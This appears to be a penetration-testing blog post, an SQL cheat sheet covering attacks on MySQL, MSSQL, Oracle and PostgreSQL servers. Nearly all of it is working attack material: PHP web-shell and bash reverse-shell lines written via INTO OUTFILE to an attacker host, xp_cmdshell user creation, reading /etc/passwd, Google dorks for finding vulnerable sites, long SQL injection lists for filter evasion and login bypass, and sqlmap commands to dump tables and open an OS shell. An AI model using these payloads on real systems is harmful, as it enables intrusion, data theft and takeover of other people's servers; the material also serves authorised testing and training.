+++
title = "SQL"
description = ""
type = ["posts","post"]
tags = [
    "web",
    "infosec",
]
date = "2021-06-08"
categories = [
    "web",
    "infosec",
]
series = ["web"]
[ author ]
  name = "Quac Tran"
+++
* [General](#general)
    * [MySQL (3306)](#mysql-3306)
    * [MSSQL (1433)](#mssql-1433)
    * [Oracle (1521)](#oracle-1521)
    * [PostgresSQL (5432)](#postgressql-5432)
* [SQL Injection](#sql-injection)
    * [Google Dorking](#google-dorking)
    * [Bad character detect](#bad-character-detect)
    * [Detect number of vulnerable columns](#detect-number-of-vulnerable-columns)
    * [Union Select](#union-select)
    * [bypass usando comentarios](#bypass-usando-comentarios)
    * [bypass usando comentarios and url encoding](#bypass-usando-comentarios-and-url-encoding)
    * [Information_schema.tables bypass](#information_schema.tables-bypass)
    * [concat](#concat)
    * [group_concat](#group_concat)
    * [Authen bypass](#authen-bypass)
* [SQLMAP](#sqlmap)
* [Reference](#reference)
# General
## MySQL-3306
#### Nmap
```bash
nmap -Pn -sV -p 3306 --script mysql* TARGETIP
```
#### Access Remotely:
```sql
mysql -host=TARGETIP -u root -p
mysql -u root -p password -e 'show databases;'
mysql -u root -p password DBNAME -e 'select * from TABLENAME;'
```
#### Access Locally:
```sql
mysql -u root -p
mysql> use DBNAME;
mysql> show tables;
```
#### Command Backdoor example:
```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/backdoor.php";
SELECT "<?php exec(""/bin/bash -c 'bash -i >&/dev/tcp/ATTACKERIP/PORT 0>&1'""); ?> " into outfile "/tmp/shell.php";
```
#### Update a field example: (i.e. change a password):
```sql
update TABLENAME set PASSWORDFIELD = 'NEWHASH' where USERNAMEFIELD = 'USERNAME';
```
#### PHPMyAdmin
Default User: root\
Default Password: (none)\
Create a new table, then go to the SQL tab
```sql
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\command.php";`
http://TARGTEIP/phpmyadmin/command.php?cmd=ipconfig
```
## MSSQL-1433
Default username : sa
#### Nmap
```bash
nmap -sV -Pn -p 1433 --script ms-sql-brute --script-args
userdb=users.txt,passdb=passwords.txt TARGETIP
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args
mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd="net usertester Tester123! /add" TARGETIP
```
#### Sqsh.
[https://sourceforge.net/projects/sqsh/](https://sourceforge.net/projects/sqsh/)\
You can use sqsh to interact with MSSQL databases.\
Install the following:
```bash
apt-get install freetds
apt-get install sqsh
```
Edit /etc/freetds/freetds.conf
```bash
[SERVERNAME]
host = 10.11.12.13
port = 1433
tds version = 8.0
```
Edit .sqshrc\
`\set style=vert`\
Connect to the database:\
```bash
sqsh -S SERVERNAME -U USER -P PASSWORD
>exec xp_cmdshell 'whoami'
>go
```
Metasploit:
```bash
use auxiliary/scanner/mssql/mssql_login
use exploit/windows/mssql/mssql_payload
```
## Oracle-1521
#### Nmap:
```bash
nmap -sV -Pn -p 1521 --script=oracle-sid-brute TARGETIP
nmap -sV -Pn -p 1521 --script=oracle-enum-users --script-args sid=ORCL,userdb=users.txt TARGETIP
```
#### Connect to Oracle from command line:
```bash
C:\>sqlplus / as sysdba
[will prompt for password]
C:\>sqlplus
[will prompt for user and password]
```
#### Oracle Default Accounts:
[https://www.orafaq.com/wiki/List_of_default_database_users](https://www.orafaq.com/wiki/List_of_default_database_users)
[http://www.petefinnigan.com/default/default_password_list.htm](http://www.petefinnigan.com/default/default_password_list.htm)\
Examples: applsys|apps; ctxsys|ctxsys;dbsnmp|dbsnmp ...

## PostgresSQL-5432
Default User: postgres
Default Password: (none)
Local Login: 
```bash
psql -d DATABASE -U USER
```
Remote Login: 
```bash
psql -h TARGETIP -d DATABASE -U USER
```
```bash
select version();	
select current_database();
select current_user;
select session_user;
select current_setting('log_connections');
select current_setting('log_statement');
select current_setting('port');
select current_setting('password_encryption');
select current_setting('krb_server_keyfile');
select current_setting('virtual_host');
select current_setting('port');
select current_setting('config_file');
select current_setting('hba_file');
select current_setting('data_directory');
select * from pg_shadow;
select * from pg_group;
create table myfile (input TEXT);
copy myfile from '/etc/passwd'; 
select * from myfile;copy myfile to /tmp/test;
```
# SQL Injection
### Google Dorking
```bash
inurl:"id=" & intext:"Warning: mysql_fetch_assoc()"
inurl:"id=" & intext:"Warning: mysql_fetch_array()"
inurl:"id=" & intext:"Warning: mysql_num_rows()"
inurl:"id=" & intext:"Warning: session_start()"
inurl:"id=" & intext:"Warning: getimagesize()"
inurl:"id=" & intext:"Warning: is_writable()"
inurl:"id=" & intext:"Warning: getimagesize()"
inurl:"id=" & intext:"Warning: Unknown()"
inurl:"id=" & intext:"Warning: session_start()"
inurl:"id=" & intext:"Warning: mysql_result()"
inurl:"id=" & intext:"Warning: pg_exec()"
inurl:"id=" & intext:"Warning: mysql_result()"
inurl:"id=" & intext:"Warning: mysql_num_rows()"
inurl:"id=" & intext:"Warning: mysql_query()"
inurl:"id=" & intext:"Warning: array_merge()"
inurl:"id=" & intext:"Warning: preg_match()"
inurl:"id=" & intext:"Warning: ilesize()"
inurl:"id=" & intext:"Warning: filesize()"
inurl:"id=" & intext:"Warning: filesize()"
inurl:"id=" & intext:"Warning: require()
inurl:aboutbook.php?id=
inurl:review.php?id=
inurl:loadpsb.php?id=
inurl:ages.php?id=
inurl:material.php?id=
inurl:clanek.php4?id=
inurl:announce.php?id=
inurl:chappies.php?id=
inurl:read.php?id=
inurl:viewapp.php?id=
inurl:viewphoto.php?id=
inurl:rub.php?idr=
inurl:galeri_info.php?l=
inurl:review.php?id=
inurl:iniziativa.php?in=
inurl:curriculum.php?id=
inurl:labels.php?id=
inurl:story.php?id=
inurl:look.php?ID=
inurl:newsone.php?id=
inurl:aboutbook.php?id=
inurl:material.php?id=
inurlpinions.php?id=
inurl:announce.php?id=
inurl:rub.php?idr=
inurl:galeri_info.php?l=
inurl:tekst.php?idt=
inurl:event.php?id=
inurlroduct-item.php?id=
inurl:sql.php?id=
inurl:news_view.php?id=
inurl:select_biblio.php?id=
inurl:humor.php?id=
inurl:aboutbook.php?id=
inurl:fiche_spectacle.php?id=
inurl:view_items.php?id= 
inurl:home.php?cat= 
inurl:item_book.php?CAT= 
inurl:www/index.php?page= 
inurl:schule/termine.php?view= 
inurl:goods_detail.php?data= 
inurl:storemanager/contents/item.php?page_code= 
inurl:view_items.php?id= 
inurl:customer/board.htm?mode= 
inurl:help/com_view.html?code= 
inurl:n_replyboard.php?typeboard= 
inurl:eng_board/view.php?T****= 
inurl:prev_results.php?prodID= 
inurl:bbs/view.php?no= 
inurl:gnu/?doc= 
inurl:zb/view.php?uid= 
inurl:global/product/product.php?gubun= 
inurl:m_view.php?ps_db= 
inurl:productlist.php?tid= 
inurl:product-list.php?id= 
inurl:onlinesales/product.php?product_id= 
inurl:garden_equipment/Fruit-Cage/product.php?pr= 
inurl:product.php?shopprodid= 
inurl:product_info.php?products_id= 
inurl:productlist.php?tid= 
inurl:showsub.php?id= 
inurl:productlist.php?fid= 
inurl:products.php?cat= 
inurl:products.php?cat= 
inurl:product-list.php?id= 
inurl:product.php?sku= 
inurl:store/product.php?productid= 
inurl:products.php?cat= 
inurl:productList.php?cat= 
inurl:product_detail.php?product_id= 
inurl:product.php?pid= 
inurl:view_items.php?id= 
inurl:more_details.php?id= 
inurl:county-facts/diary/vcsgen.php?id= 
inurl:idlechat/message.php?id= 
inurl:podcast/item.php?pid= 
inurl:products.php?act= 
inurl:details.php?prodId= 
inurl:socsci/events/full_details.php?id= 
inurl:ourblog.php?categoryid= 
inurl:mall/more.php?ProdID= 
inurl:archive/get.php?message_id= 
inurl:review/review_form.php?item_id= 
inurl:english/publicproducts.php?groupid= 
inurl:news_and_notices.php?news_id= 
inurl:rounds-detail.php?id=
sqlmap.py -g "DOKR"
sqlmap.py -g "inurl:\".php?id=1\""
```
### Bad character detect
```bash
'
''
`
``
,
"
""
/
//
\
\\
;
' or "
-- or # 
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
'='
'LIKE'
'=0--+
 OR 1=1
' OR 'x'='x
' AND id IS NULL; --
'''''''''''''UNION SELECT '2
%00
/*…*/ 
+
||
%
AND 1
AND 0
AND true
AND false
1-false
1-true
1*56
-2
1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+
1' ORDER BY 1,2--+
1' ORDER BY 1,2,3--+
1' GROUP BY 1,2,--+
1' GROUP BY 1,2,3--+
' GROUP BY columnnames having 1=1 -- - 
-1' UNION SELECT 1,2,3--+
' UNION SELECT sum(columnname ) from tablename -- - 
-1 UNION SELECT 1 INTO @,@
-1 UNION SELECT 1 INTO @,@,@
1 AND (SELECT * FROM Users) = 1	
' AND MID(VERSION(),1,1) = '5';
' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
,(select * from (select(sleep(10)))a)
%2c(select%20*%20from%20(select(sleep(10)))a)
';WAITFOR DELAY '0:0:30'--
#
/*
-- -
;%00
`
/?q=1
/?q=1'
/?q=1"
/?q=[1]
/?q[]=1
/?q=1`
/?q=1\
/?q=1/*'*/
/?q=1/*!1111'*/
/?q=1'||'asd'||'
/?q=1' or '1'='1
/?q=1 or 1=1
/?q='or''='
```
### Detect number of vulnerable columns
```bash
ORDER BY 1-- 
ORDER BY 2-- 
ORDER BY 3-- 
ORDER BY 4-- 
ORDER BY 5-- 
ORDER BY 6-- 
ORDER BY 7-- 
ORDER BY 8-- 
ORDER BY 9-- 
ORDER BY 10-- 

ORDER BY 1# 
ORDER BY 2# 
ORDER BY 3# 
ORDER BY 4# 
ORDER BY 5# 
ORDER BY 6# 
ORDER BY 7# 
ORDER BY 8# 
ORDER BY 9# 
ORDER BY 10#
```

### Union Select
```bash
UNION SELECT 1
UNION SELECT 1,2
UNION SELECT 1,2,3
UNION SELECT 1,2,3,4
UNION SELECT 1,2,3,4,5
UNION SELECT 1,2,3,4,5,6
UNION SELECT 1,2,3,4,5,6,7
UNION ALL SELECT 1
UNION ALL SELECT 1,2
UNION ALL SELECT 1,2,3
UNION ALL SELECT 1,2,3,4
UNION ALL SELECT 1,2,3,4,5
UNION ALL SELECT 1,2,3,4,5,6
UNION ALL SELECT 1,2,3,4,5,6,7

UNION(SELECT 1)
UNION(SELECT 1,2)
UNION(SELECT 1,2,3)
UNION(SELECT 1,2,3,4)
UNION(SELECT 1,2,3,4,5)
UNION(SELECT 1,2,3,4,5,6)
UNION(SELECT 1,2,3,4,5,6,7)

UNION ALL(SELECT 1)
UNION ALL(SELECT 1,2)
UNION ALL(SELECT 1,2,3)
UNION ALL(SELECT 1,2,3,4)
UNION ALL(SELECT 1,2,3,4,5)
UNION ALL(SELECT 1,2,3,4,5,6)
UNION ALL(SELECT 1,2,3,4,5,6,7)

AND 1 UNION SELECT 1
AND 1 UNION SELECT 1,2
AND 1 UNION SELECT 1,2,3
AND 1 UNION SELECT 1,2,3,4
AND 1 UNION SELECT 1,2,3,4,5
AND 1 UNION SELECT 1,2,3,4,5,6
AND 1 UNION SELECT 1,2,3,4,5,6,7
NION DISTINCTROW SELECT 1
UNION DISTINCTROW SELECT 1,2
UNION DISTINCTROW SELECT 1,2,3
UNION DISTINCTROW SELECT 1,2,3,4
UNION DISTINCTROW SELECT 1,2,3,4,5
UNION DISTINCTROW SELECT 1,2,3,4,5,6
```

### bypass usando comentarios
```bash
/*!UNION*/ /*!SELECT*/ 1
/*!UNION*/ /*!SELECT*/ 1,2
/*!UNION*/ /*!SELECT*/ 1,2,3
/*!UNION*/ /*!SELECT*/ 1,2,3,4
/*!UNION*/ /*!SELECT*/ 1,2,3,4,5
/*!UNION*/ /*!SELECT*/ 1,2,3,4,5,6
/*!UNION*/ /*!SELECT*/ 1,2,3,4,5,6,7

/*!12345UNION*/ /*!12345SELECT*/ 1
/*!12345UNION*/ /*!12345SELECT*/ 1,2
/*!12345UNION*/ /*!12345SELECT*/ 1,2,3
/*!12345UNION*/ /*!12345SELECT*/ 1,2,3,4
/*!12345UNION*/ /*!12345SELECT*/ 1,2,3,4,5
/*!12345UNION*/ /*!12345SELECT*/ 1,2,3,4,5,6
/*!12345UNION*/ /*!12345SELECT*/ 1,2,3,4,5,6,7

/*!12345UNION*/(/*!12345SELECT*/ 1)
/*!12345UNION*/(/*!12345SELECT*/ 1,2)
/*!12345UNION*/(/*!12345SELECT*/ 1,2,3)
/*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4)
/*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4,5)
/*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4,5,6)
/*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4,5,6,7)
```

### bypass usando comentarios and url encoding
```bash
/*!%55nion*/%20/*!%53elect*/1
/*!%55nion*/%20/*!%53elect*/%201,2
/*!%55nion*/%20/*!%53elect*/%201,2,3
/*!%55nion*/%20/*!%53elect*/%201,2,3,4
/*!%55nion*/%20/*!%53elect*/%201,2,3,4,5
/*!%55nion*/%20/*!%53elect*/%201,2,3,4,5,6
/*!%55nion*/%20/*!%53elect*/%201,2,3,4,5,6,7

/*!12345%55nion*/ /*!12345%53elect*/ 1
/*!12345%55nion*/ /*!12345%53elect*/ 1,2
/*!1234%55nion*/ /*!12345%53elect*/ 1,2,3
/*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4
/*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4,5
/*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4,5,6
/*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4,5,6,7

/*!12345%55nion*/(/*!12345%53elect*/ 1)
/*!12345%55nion*/(/*!12345%53elect*/ 1,2)
/*!12345%55nion*/(/*!12345%53elect*/ 1,2,3)
/*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4)
/*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4,5)
/*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4,5,6)
/*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4,5,6,7)
```

### Information_schema.tables bypass
```bash
/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=schEMA()-- -
/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like schEMA()-- -
/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=database()-- -
/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like database()-- -
/*!FrOm*/+%69nformation_schema./**/columns+/*!50000Where*/+/*!%54able_name*/=hex table
/*!FrOm*/+information_schema./**/columns+/*!12345Where*/+/*!%54able_name*/ like hex table
```
### Concat
```bash
CoNcAt()
concat() 
CON%08CAT()
CoNcAt()
%0AcOnCat()
/**//*!12345cOnCat*/
/*!50000cOnCat*/(/*!*/)
unhex(hex(concat(table_name)))
unhex(hex(/*!12345concat*/(table_name)))
unhex(hex(/*!50000concat*/(table_name)))
```
### group_concat
```bash
/*!group_concat*/()
gRoUp_cOnCAt()
group_concat(/*!*/)
group_concat(/*!12345table_name*/)
group_concat(/*!50000table_name*/)
/*!group_concat*/(/*!12345table_name*/)
/*!group_concat*/(/*!50000table_name*/)
/*!12345group_concat*/(/*!12345table_name*/)
/*!50000group_concat*/(/*!50000table_name*/)
/*!GrOuP_ConCaT*/()
/*!12345GroUP_ConCat*/()
/*!50000gRouP_cOnCaT*/()
/*!50000Gr%6fuP_c%6fnCAT*/()
```
### Authen bypass
```bash
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
==
=
'
' --
' #
' –
'--
'/*
'#
" --
" #
"/*
' and 1='1
' and a='a
 or 1=1
 or true
' or ''='
" or ""="
1′) and '1′='1–
' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055
" AND 1=0 UNION ALL SELECT "", "81dc9bdb52d04dc20036dbd8313ed055
 and 1=1
 and 1=1–
' and 'one'='one
' and 'one'='one–
' group by password having 1=1--
' group by userid having 1=1--
' group by username having 1=1--
 like '%'
 or 0=0 --
 or 0=0 #
 or 0=0 –
' or         0=0 #
' or 0=0 --
' or 0=0 #
' or 0=0 –
" or 0=0 --
" or 0=0 #
" or 0=0 –
%' or '0'='0
 or 1=1
 or 1=1--
 or 1=1/*
 or 1=1#
 or 1=1–
' or 1=1--
' or '1'='1
' or '1'='1'--
' or '1'='1'/*
' or '1'='1'#
' or '1′='1
' or 1=1
' or 1=1 --
' or 1=1 –
' or 1=1--
' or 1=1;#
' or 1=1/*
' or 1=1#
' or 1=1–
') or '1'='1
') or '1'='1--
') or '1'='1'--
') or '1'='1'/*
') or '1'='1'#
') or ('1'='1
') or ('1'='1--
') or ('1'='1'--
') or ('1'='1'/*
') or ('1'='1'#
'or'1=1
'or'1=1′
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or "1"="1"#
" or 1=1
" or 1=1 --
" or 1=1 –
" or 1=1--
" or 1=1/*
" or 1=1#
" or 1=1–
") or "1"="1
") or "1"="1"--
") or "1"="1"/*
") or "1"="1"#
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"/*
") or ("1"="1"#
) or '1′='1–
) or ('1′='1–
' or 1=1 LIMIT 1;#
'or 1=1 or ''='
"or 1=1 or ""="
' or 'a'='a
' or a=a--
' or a=a–
') or ('a'='a
" or "a"="a
") or ("a"="a
') or ('a'='a and hi") or ("a"="a
' or 'one'='one
' or 'one'='one–
' or uid like '%
' or uname like '%
' or userid like '%
' or user like '%
' or username like '%
' or 'x'='x
') or ('x'='x
" or "x"="x
' OR 'x'='x'#;
'=' 'or' and '=' 'or'
' UNION ALL SELECT 1, @@version;#
' UNION ALL SELECT system_user(),user();#
' UNION select table_schema,table_name FROM information_Schema.tables;#
admin' and substring(password/text(),1,1)='7
' and substring(password/text(),1,1)='7
' or 1=1 limit 1 -- -+
'="or'
```
# SQLMAP
```bash
sqlmap -u "http://testsite.com/login.php" 
[eazy scan]
sqlmap -r request.txt 
[eazy scan with request file]
sqlmap -u "http://testsite.com/login.php" --tor --tor-type=SOCKS5 
[using tor]
sqlmap -u "http://testsite.com/login.php" --dbs 
[list all database]
sqlmap -u "http://testsite.com/login.php" -D site_db --tables
[list table in db site_db]
sqlmap -u "http://testsite.com/login.php" -D site_db -T users --columns
[list collums]
sqlmap -u "http://testsite.com/login.php" -D site_db -T users -C username,password --dump
[Dump only selected columns]
sqlmap -u "http://testsite.com/login.php" –method "POST" –data "username=admin&password=admin&submit=Submit" -D social_mccodes -T users –dump
[Dump a table from a database when you have admin credentials]
sqlmap --dbms=mysql -u "http://testsite.com/login.php" --os-shell
[Get OS Shel]
sqlmap --dbms=mysql -u "http://testsite.com/login.php" --sql-shell
[Get SQL Shell]
sqlmap -r login-chris.request --level 5 --risk 3 --batch --string "Wrong identification(query corect)"
[best]
```
# Reference

-[https://sqlwiki.netspi.com/#mysql](https://sqlwiki.netspi.com/#mysql)\
-[https://sites.google.com/a/michaelboman.org/www-michaelboman-org/books/sql-injection-cheat-sheet-oracle](https://sites.google.com/a/michaelboman.org/www-michaelboman-org/books/sql-injection-cheat-sheet-oracle)\
-[https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/](https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/)\
-[https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/](https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/)